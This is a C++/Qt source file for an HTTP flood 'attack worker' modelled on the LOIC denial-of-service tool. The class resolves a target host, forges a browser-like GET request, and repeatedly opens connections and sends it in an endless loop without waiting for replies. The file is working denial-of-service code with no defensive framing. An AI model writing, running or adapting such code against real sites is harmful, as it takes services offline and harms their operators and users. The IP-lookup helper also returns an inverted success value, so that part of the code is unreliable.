#include <QByteArray>
#include <QHostInfo>

#include "httpattackworker.h"

namespace workers
{
    HttpAttackWorker::HttpAttackWorker(QUrl url)
        : AttackWorkerBase(url),
          isSingleShot_(false)
    {
        generateHttpHeader();
        tryObtainIp();
    }

    void HttpAttackWorker::doWork()
    {
        do
        {
            if(initializeConnection())
            {
                sendPayload();
            }
        } while(!isSingleShot_);
    }

    void HttpAttackWorker::setSingleShot(bool singleShot)
    {
        isSingleShot_ = singleShot;
    }

    void HttpAttackWorker::generateHttpHeader()
    {
        auto httpHeader = QString("GET %1 HTTP/1.1\r\nHost:%2\r\nConnection: keep-alive\r\nUser-Agent: %3\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept-Language: en-US,en;q=0.8,fr;q=0.6\r\n\r\n")
                // Get resource
                .arg(url_.toString())
                // Host
                .arg(url_.host())
                // User-agent
                .arg("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");

        httpHeaderAsByteArray_ = httpHeader.toUtf8();
    }

    bool HttpAttackWorker::initializeConnection()
    {
        socket_ = std::make_unique<QTcpSocket>();
        socket_->connectToHost(ip_, url_.port(80));

        return socket_->waitForConnected() && socket_->state() == QAbstractSocket::ConnectedState;
    }

    void HttpAttackWorker::sendPayload()
    {
        socket_->write(httpHeaderAsByteArray_);
        socket_->waitForBytesWritten();

        // In this implementation, we don't wait on an answer of the server (on option in LOIC).
        // This code is kept for reference.
        /*if(socket_->waitForReadyRead(30))
        {
            QByteArray response = socket_->readAll();
        }*/
    }

    bool HttpAttackWorker::tryObtainIp()
    {
        QHostInfo hostInfo = QHostInfo::fromName(url_.host());

        if(hostInfo.addresses().count() > 0)
        {
            ip_ = hostInfo.addresses()[0].toString();
        }

        return ip_.isNull();
    }
}
